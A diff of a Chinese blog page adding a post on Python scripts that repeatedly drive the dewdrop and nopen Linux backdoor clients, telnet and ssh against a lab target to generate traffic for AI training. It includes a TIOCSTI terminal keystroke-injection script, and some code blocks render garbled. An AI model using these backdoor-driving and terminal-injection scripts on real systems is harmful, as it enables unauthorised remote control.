@@ -22,7 +22,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>Sayingの魔法书</title>
+  <title>重复执行程序脚本 - Sayingの魔法书</title>
+  
+    <meta name="keywords" content="python,重定向">
   
 
   
@@ -351,7 +353,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper list featured' style="display: none;">
+        <div id="full" class='cover-wrapper post featured' style="display: none;">
           
             <div id='cover-backstretch'></div>
           
@@ -414,42 +416,313 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
-
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-    <section class="post-list">
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-    </section>
+
+
   
+    <div class='headimg-div'>
+      <a class='headimg-a'>
+        <img class='headimg' src='https://gitee.com/saying_yy/blog-image/raw/master/img/20210606143000.png'/>
+      </a>
+    </div>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        重复执行程序脚本
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/Dian/">Dian</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Sep 8, 2020</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="重复执行程序脚本" data-path="/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <p>在项目组工作的过程中，遇到了一个任务：需要重复执行某程序，生成大量的流量。抓取流量，用于AI的学习。因此需要写脚本不断执行程序。我选择了python语言。</p>
+<h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><h3 id="（1）dewdrop"><a href="#（1）dewdrop" class="headerlink" title="（1）dewdrop"></a>（1）dewdrop</h3><p>dewdrop是一款linux后门软件。在靶机上运行dewdrop服务器后，就可以在攻击机上运行dewdrop客户端连接上靶机，实现远程控制。</p>
+<p>我选择subprocess模块。subprocess模块允许启动一个新进程，并将它连接到标准输入/标准输出/标准错误管道。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line">from random import choice</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) != 6:</span><br><span class="line">        print(&#x27;\nUsage:\nrundewdrop.py [victim ip] [victim port] &#x27;</span><br><span class="line">              &#x27;[Listener ip] [Listener port] [Number of command]\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    dport = int(sys.argv[2])</span><br><span class="line">    listener_ip = sys.argv[3]</span><br><span class="line">    listener_port = int(sys.argv[4])</span><br><span class="line">    command_number = int(sys.argv[5])</span><br><span class="line">    run_command = &#x27;./tipoff -i -r tcp -t &#123;&#125; -p &#123;&#125; -a &#123;&#125; -c &#123;&#125;&#x27;.format(dip, dport, listener_ip, listener_port)</span><br><span class="line">    p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True)</span><br><span class="line">    time.sleep(10)</span><br><span class="line">    </span><br><span class="line">    with open(&#x27;command.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        command_list = [line.strip() for line in f.readlines()]</span><br><span class="line">        for i in range(command_number):</span><br><span class="line">            p.stdin.write(choice(command_list) + &quot;\n&quot;)</span><br><span class="line">            time.sleep(0.2)</span><br><span class="line">    time.sleep(10)</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：</p>
+<ul>
+<li><p>在tipoff同目录下新建一个command.txt文件。文件中每一行为所执行的命令。</p>
+</li>
+<li><p>运行程序，即可不断随机执行命令。</p>
+</li>
+<li><p>```<br>python rundewdrop.py   [victim ip] [victim port] [Listener ip] [Listener port] [Number of command]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### （2）nopen</span><br><span class="line"></span><br><span class="line">nopen也是一款linux后门软件，使用方法与dewdrop类似。在靶机上运行nopen server后，可以使nopen client远程控制。</span><br><span class="line"></span><br><span class="line">然而，脚本却艰难重重。</span><br><span class="line"></span><br><span class="line">#### 1.subprocess模块</span><br><span class="line"></span><br><span class="line">我的第一选择当然是选择与dewdrop相同的方法，使用了subprocess模块。然而，却遇到了问题。nopen client出现了报错。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>error: failed to open global_output_file</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">瞬间懵逼......</span><br><span class="line"></span><br><span class="line">有趣的是，这个nopen client程序还会骂人，还是骂20遍：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>What? are you nuts?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 2.其他重定向方法</span><br><span class="line"></span><br><span class="line">我还采取了其他重定向输入方法。如&lt;，管道符|，都遇到了一模一样的问题。仿佛只要重定向就会报错。</span><br><span class="line"></span><br><span class="line">#### 3.寻找原因</span><br><span class="line"></span><br><span class="line">既然找不到原因，就直接逆向分析......动调调试了很久，找到了报错的关键之处。</span><br><span class="line"></span><br><span class="line">运行nopen client后，每输入一条命令，都会尝试去运行fdopen函数。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>FILE* fdopen(int fildes,const char* mode); </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fdopen的第一个参数为文件描述符。但是诡异的是：动调发现，运行到这里，打开的文件文件描述符为0。0正是标准输入流。打开文件成功即可继续运行。打开文件失败则报错退出。</span><br><span class="line"></span><br><span class="line">明明是在已经输入命令之后，难以理解为什么又会打开标准输入流。手动测试了fdopen这个函数。它确实能打开标准输入流，甚至向标准输入流中输出。然而一但进行重定向，这个函数就返回null。</span><br><span class="line"></span><br><span class="line">在钟sir的指导下，了解到了也存在0不是标准输入流的可能。程序是可以将0重定向到其他流的。</span><br><span class="line"></span><br><span class="line">继续逆向分析，却收效甚微......就算找到了错误的地方，也仍然不一定能找到解决方法。</span><br><span class="line"></span><br><span class="line">#### 4.termios模块伪造终端输入</span><br><span class="line"></span><br><span class="line">这是一个突发奇想，既然无法重定向输入，能否选择其他方式输入？一番搜索之下，找到了python的termios模块，可以伪造终端输入。</span><br><span class="line"></span><br><span class="line">在 Linux 中可以通过一组函数调用（通用终端接口，简称GTI）来控制终端。termios是在 POSIX 规范中定义的标准接口。python中的termios模块正是通过这个接口，从底层实现伪造终端输入。</span><br><span class="line"></span><br><span class="line">因此思路很简单：只需打开一个终端，运行nopen。再打开另一个终端，通过伪造输入向nopen所在终端输入命令，实现nopen重复的运行。</span><br><span class="line"></span><br><span class="line">脚本如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#!/usr/bin/python</p>
+</li>
+</ul>
+<p>import sys,os,fcntl,termios<br>from random import choice<br>if len(sys.argv) != 3:<br>   sys.stderr.write(“usage: ttyexec.py tty command_number\n”)<br>   sys.exit(1)<br>fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)<br>command_number = int(sys.argv[2])</p>
+<p>with open(‘commands.txt’, ‘r’) as f:<br>    command_list = [line.strip() for line in f.readlines()]</p>
+<pre><code>for i in range(command_number):
+    cmd = choice(command_list)
+    for j in range(len(cmd)):
+       fcntl.ioctl(fd, termios.TIOCSTI, cmd[j])
+    fcntl.ioctl(fd, termios.TIOCSTI, &#39;\n&#39;)
+</code></pre>
+<p>os.close(fd)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在我自己的环境终于测试成功！！！，然而......AI的人在docker运行出错了。</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">AI方向使用docker运行脚本，docker运行的过程中报错如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>IOError:[Errno 1]Operation not permitted</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">明显是一个权限问题。去百度了这个问题，确实是权限不足。</span><br><span class="line"></span><br><span class="line">百度到的问题是root权限尝试修改某些特殊文件出现这个报错，原因在于文件属性。查看文件属性可以发现文件有属性i，可以确保文件不被修改。执行比chmod更底层的命令chattr，可以修改文件属性，随后便可以修改文件。</span><br><span class="line"></span><br><span class="line">然而，这对解决问题没有太大帮助。因为无法用chattr命令去修改/der/pts/tty的属性。</span><br><span class="line"></span><br><span class="line">#### 5.最终方法</span><br><span class="line"></span><br><span class="line">经历了许久，最后突然想到可以绕过这个问题。在伪造终端输入的时候，向其他终端伪造输入是需要管理员权限的，但是在运行该脚本的自身终端输入则不需要管理员权限。可以控制脚本sleep几秒，并后台运行。再打开nopen，就可以实现重复执行命令。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#!/usr/bin/python</p>
+<p>import sys,os,fcntl,termios<br>from random import choice<br>if len(sys.argv) != 3:<br>   sys.stderr.write(“usage: ttyexec.py tty command_number\n”)<br>   sys.exit(1)<br>fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)<br>command_number = int(sys.argv[2])<br>sleep(10)</p>
+<p>with open(‘commands.txt’, ‘r’) as f:<br>    command_list = [line.strip() for line in f.readlines()]</p>
+<pre><code>for i in range(command_number):
+    cmd = choice(command_list)
+    for j in range(len(cmd)):
+       fcntl.ioctl(fd, termios.TIOCSTI, cmd[j])
+    fcntl.ioctl(fd, termios.TIOCSTI, &#39;\n&#39;)
+</code></pre>
+<p>os.close(fd)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line">- commands.txt 执行命令的内容（需要与ttyexec.py在同一目录下）</span><br><span class="line"></span><br><span class="line">- commands.txt每一行为需要执行的命令</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  $ python ttyexec.py tty 100 &amp;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在同一终端运行nopen client</li>
+</ul>
+<h3 id="（3）telnet"><a href="#（3）telnet" class="headerlink" title="（3）telnet"></a>（3）telnet</h3><p>实现telnet的重定向方法很多，这里采用与dewdrop相同的方法，使用subprocess模块。不同之处仅仅在于需要输入用户名和密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line">from random import choice</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&#x27;\nUsage:\nruntelnet.py [victim ip] [username] [passwd] [commands number]\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    username = sys.argv[2]</span><br><span class="line">    passwd = sys.argv[3]</span><br><span class="line">    command_number = int(sys.argv[4])</span><br><span class="line">    </span><br><span class="line">    run_command = &#x27;telnet &#123;&#125; &#x27;.format(dip)</span><br><span class="line">    p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(username)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;\n&quot;)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(passwd)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;\n&quot;)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        command_list = [line.strip() for line in f.readlines()]</span><br><span class="line">        for i in range(command_number):</span><br><span class="line">            p.stdin.write(choice(command_list) + &quot;\n&quot;)</span><br><span class="line">            p.stdin.write(str(i) + &quot;\n&quot;)</span><br><span class="line">            p.stdin.flush()</span><br><span class="line">            time.sleep(0.2)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;exit\n&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：</p>
+<ul>
+<li><p>运行环境python2</p>
+</li>
+<li><p>需要在同一目录新建一个commands.txt，commands.txt中每一行为所需执行的命令。</p>
+</li>
+<li><p>运行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python runtelnet.py &#123;ip地址&#125; &#123;用户名&#125; &#123;密码&#125; &#123;发包个数&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒）</p>
+</li>
+</ul>
+<h3 id="（4）ssh"><a href="#（4）ssh" class="headerlink" title="（4）ssh"></a>（4）ssh</h3><p>ssh会自动检测输入是否被重定向。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal</span><br></pre></td></tr></table></figure>
+
+<p>可以使用-tt强制分配为伪终端，即使标准输入不是终端。尽管如此，ssh的密码依然无法通过重定向输入，需要手动输入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import subprocess</span><br><span class="line">from random import choice</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    #check for args, print usage if incorrect</span><br><span class="line">    if len(sys.argv) != 3:</span><br><span class="line">        print(&#x27;\nUsage:\nrunssh.py [victim ip] [commands number]\n&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    dip = sys.argv[1]</span><br><span class="line">    command_number = int(sys.argv[2])</span><br><span class="line">    </span><br><span class="line">    run_command = &#x27;ssh -tt &#123;&#125; &#x27;.format(dip)</span><br><span class="line">    p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True)</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    p.stdin.write(&quot;\n&quot;)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        command_list = [line.strip() for line in f.readlines()]</span><br><span class="line">        for i in range(command_number):</span><br><span class="line">            p.stdin.write(choice(command_list) + &quot;\n&quot;)</span><br><span class="line">            p.stdin.write(str(i) + &quot;\n&quot;)</span><br><span class="line">            p.stdin.flush()</span><br><span class="line">            time.sleep(0.2)</span><br><span class="line">    time.sleep(10)</span><br><span class="line">    p.stdin.write(&quot;exit\n&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：</p>
+<ul>
+<li><p>运行环境 python2</p>
+</li>
+<li><p>需要在本目录新建一个commands.txt，commands.txt中每行为所需要执行的命令。</p>
+</li>
+<li><p>运行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python runssh.py &#123;目标ip&#125; &#123;执行命令个数&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>执行后需要手动输入靶机密码。输入密码后程序自动继续运行。</p>
+</li>
+<li><p>已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒）</p>
+</li>
+</ul>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/>http://example.com/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-06T14:30:33+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jun 6, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/python/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>python</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%87%8D%E5%AE%9A%E5%90%91/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>重定向</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/&title=重复执行程序脚本 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/&title=重复执行程序脚本 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/09/08/%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E8%84%9A%E6%9C%AC/&title=重复执行程序脚本 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2020/12/12/bash%E4%B8%8B%E7%9A%84%E8%BD%AC%E4%B9%89/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>bash下的转义</p>
+          <p class='content'>bash下的转义bash手册如下:没错这篇博客是纯copy手册
+12345678910111213141516171819202122232425262728293031323334353637...</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/08/24/unicode%E7%9A%84%E5%B0%8F%E6%8A%8A%E6%88%8F/'>
+          <p class='title'>unicode的小把戏<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>UnicodeUnicode是计算机科学领域里的一项业界标准，它为每种语言中的每个字符设定了统一并且唯一的二进制编码。
+下面来说一说一些unicode的trick 
+QQ聊天小尾巴（仅限手机端）...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -457,141 +730,28 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://gitee.com/saying_yy/blog-image/raw/master/img/2.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>Saying</h2>
-        
-        
-          <p>一只蒻苟</p>
 
-        
-        
-          <p><span id="jinrishici-sentence">Sayingの魔法书</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/1396318209@qq.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/saying-yan"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/CTF-web/" href="/categories/CTF-web/"
-            id="categoriesCTF-web"
-            ><div class='name'>CTF-web</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/Dian/" href="/categories/Dian/"
-            id="categoriesDian"
-            ><div class='name'>Dian</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/misc/" href="/categories/misc/"
-            id="categoriesmisc"
-            ><div class='name'>misc</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81"><span class="toc-text">一、</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89dewdrop"><span class="toc-text">（1）dewdrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89telnet"><span class="toc-text">（3）telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%884%EF%BC%89ssh"><span class="toc-text">（4）ssh</span></a></li></ol></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
